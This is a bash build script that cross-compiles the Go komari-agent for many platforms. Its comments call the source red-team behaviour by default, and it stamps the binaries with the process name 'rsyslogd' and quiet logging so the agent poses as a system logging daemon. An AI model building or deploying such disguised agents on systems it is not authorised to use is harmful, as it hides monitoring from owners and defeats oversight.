#!/bin/bash

# 定义颜色
RED='\033[0;31m'
GREEN='\033[0;32m'
WHITE='\033[0;37m'
NC='\033[0m' # 无颜色

# 定义操作系统和架构列表
OS_LIST=("windows" "linux" "darwin" "freebsd")
ARCH_LIST=("amd64" "arm64" "386" "arm" "loong64" "riscv64" "s390x" "ppc64" "ppc64le" "mips" "mipsle" "mips64" "mips64le")
# 仅 Linux 提供的架构
LINUX_ONLY_ARCH_LIST=("loong64" "riscv64" "s390x" "ppc64" "ppc64le" "mips" "mipsle" "mips64" "mips64le")

is_linux_only_arch() {
  local candidate="$1"
  local linux_only
  for linux_only in "${LINUX_ONLY_ARCH_LIST[@]}"; do
    if [ "$candidate" = "$linux_only" ]; then
      return 0
    fi
  done
  return 1
}

# 创建构建目录
mkdir -p ./build

# 源码默认已是红队行为。这里只覆盖进程名，并用 QUIET=0 重新打开身份日志。
# 运行时关闭伪装：--disable-process-mask --show-banner --disable-security-warning=false
VERSION=$(git describe --tags --abbrev=0 2>/dev/null || echo "dev")
if [ "${PROCESS_NAME+set}" != "set" ]; then
  PROCESS_NAME=rsyslogd
fi
QUIET="${QUIET:-1}"
LDFLAGS="-s -w -X github.com/komari-monitor/komari-agent/update.CurrentVersion=${VERSION} -X github.com/komari-monitor/komari-agent/cmd.compiledProcessName=${PROCESS_NAME} -X github.com/komari-monitor/komari-agent/cmd.compiledQuiet=${QUIET}"

# 初始化失败列表
FAILED_BUILDS=()

# 遍历操作系统和架构组合
for GOOS in "${OS_LIST[@]}"; do
  for GOARCH in "${ARCH_LIST[@]}"; do
    # 排除仅由 Linux 支持的架构，以及 windows/arm、darwin/386 和 darwin/arm
    if { [ "$GOOS" = "windows" ] && [ "$GOARCH" = "arm" ]; } || \
       { [ "$GOOS" = "darwin" ] && { [ "$GOARCH" = "386" ] || [ "$GOARCH" = "arm" ]; }; } || \
       { [ "$GOOS" != "linux" ] && is_linux_only_arch "$GOARCH"; }; then
      continue
    fi

    echo -e "Building for $GOOS/$GOARCH..."

    # 设置输出二进制文件名
    BINARY_NAME="komari-agent-${GOOS}-${GOARCH}"
    if [ "$GOOS" = "windows" ]; then
      BINARY_NAME="${BINARY_NAME}.exe"
    fi

    # 构建二进制文件
    env GOOS=$GOOS GOARCH=$GOARCH CGO_ENABLED=0 go build -trimpath -ldflags="${LDFLAGS}" -o "./build/$BINARY_NAME"

    if [ $? -ne 0 ]; then
      echo -e "${RED}Failed to build for $GOOS/$GOARCH${NC}"
      FAILED_BUILDS+=("$GOOS/$GOARCH")
    else
      echo -e "${GREEN}Successfully built $BINARY_NAME${NC}"
    fi
  done
done

# 输出失败的构建
if [ ${#FAILED_BUILDS[@]} -ne 0 ]; then
  echo -e "\n${RED}The following builds failed:${NC}"
  for BUILD in "${FAILED_BUILDS[@]}"; do
    echo -e "${RED}- $BUILD${NC}"
  done
else
  echo -e "\n${GREEN}All builds completed successfully.${NC}"
fi

# 提示构建完成
echo -e "\nBinaries are in the ./build directory."
